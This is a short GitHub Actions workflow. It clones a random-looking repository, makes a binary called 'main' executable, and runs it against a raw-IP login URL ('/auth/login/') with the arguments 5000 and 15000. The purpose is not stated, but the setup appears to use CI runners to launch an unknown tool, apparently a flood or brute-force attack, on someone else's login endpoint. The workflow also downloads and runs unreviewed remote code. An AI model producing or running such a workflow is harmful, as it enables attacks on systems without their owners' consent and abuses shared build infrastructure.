name: abc

on: [workflow_dispatch]

jobs:
  clone-and-run:
    runs-on: ubuntu-latest

    steps:
    - name: Checkout current repository
      uses: actions/checkout@v4

    - name: Clone target repository
      run: git clone https://github.com/sdasdsaddd33/sadasdasdsdd6848686868648.git ./target-repo

    - name: Make main
      run: chmod +x ./target-repo/main

    - name: Runs
      run: |
        cd ./target-repo
        ./main https://45.32.31.33/auth/login/ 5000 15000